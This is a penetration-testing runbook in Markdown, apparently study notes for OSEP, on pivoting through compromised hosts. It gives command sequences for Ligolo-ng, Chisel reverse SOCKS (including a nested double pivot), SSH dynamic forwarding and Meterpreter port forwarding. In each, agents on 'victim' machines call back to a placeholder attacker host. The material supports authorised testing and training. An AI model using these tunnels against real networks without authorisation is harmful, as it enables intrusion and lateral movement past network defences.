---
tags: [pivoting, tunneling, ligolo, chisel, ssh, socks]
---

# 🌀 Pivoting & Tunneling (400/500 Level)

> [!ABSTRACT]
> This runbook covers the mechanics of routing traffic through compromised hosts to reach isolated network segments.
> **Goal**: Create stable, bi-directional communication channels for all tools (Nmap, CrackMapExec, Impacket).

---

## 🛠️ Phase 1: The Modern Standard (Ligolo-ng)

> [!TIP] Ligolo-ng is the preferred pivoting tool for OSEP. It creates a real TUN interface on Kali.

### 1. One-time Setup (Kali)
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
# Start Proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

### 2. Connect Agent (Victim)
```powershell
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

### 3. Start Tunnel (In Proxy Console)
```bash
# Select session and start
session
1
start
```

### 4. Route Traffic (Kali)
```bash
# After starting tunnel, add the internal route on Kali
sudo ip route add 172.16.1.0/24 dev ligolo
# Now nmap/xfreerdp works directly
```

---

## 🏗️ Phase 2: Firewalled/Restrictive Tunnels (Chisel)

> [!INFO] Use Chisel when you need to tunnel over HTTP/HTTPS to bypass strict egress filters.

### 1. Reverse SOCKS (Kali as Server)
```bash
# Kali (Server)
./chisel server --reverse --port 8080 --socks5

# Victim (Client)
.\chisel.exe client <KALI_IP>:8080 R:socks
```
*ProxyChains Configuration: Ensure `socks5 127.0.0.1 1080` is in `/etc/proxychains4.conf`.*

### 2. Double Pivot (Chisel Nested)
1. **Hop 1 (Kali ↔ Victim1)**: Setup reverse SOCKS as above.
2. **Hop 2 (Victim1 ↔ Victim2)**:
   - On **Victim1**: Start chisel server `.\chisel.exe server --reverse --port 9001 --socks5`
   - On **Victim2**: Connect to Victim1 `.\chisel.exe client <V1_IP>:9001 R:1081:socks`
   - On **Victim1**: Forward that port back to Kali `.\chisel.exe client <KALI_IP>:8080 R:1081:127.0.0.1:1081`

---

## 🚇 Phase 3: Legacy & Utility Tunnels

### 1. SSH Dynamic SOCKS
```bash
# Create SOCKS proxy at Kali:1080
ssh -D 1080 -N -f <USER>@<PIVOT_IP>
```

### 2. Meterpreter `portfwd`
```bash
# Single port forward
meterpreter > portfwd add -l 4445 -p 445 -r <INTERNAL_IP>
```

### 3. `netsh` Port Forward (Windows Native)
*See [[Admin Reference]] for detailed commands.*

---

## 🔗 Related Notes
- [[Active Directory]] - For attacking internal AD controllers.
- [[Admin Reference]] - For `netsh` syntax and SSH key management.
- [[SQL Attacks]] - For tunneling `impacket-mssqlclient` to internal servers.
- [[File Transfer]] - For moving `chisel` and `agent.exe` binaries.
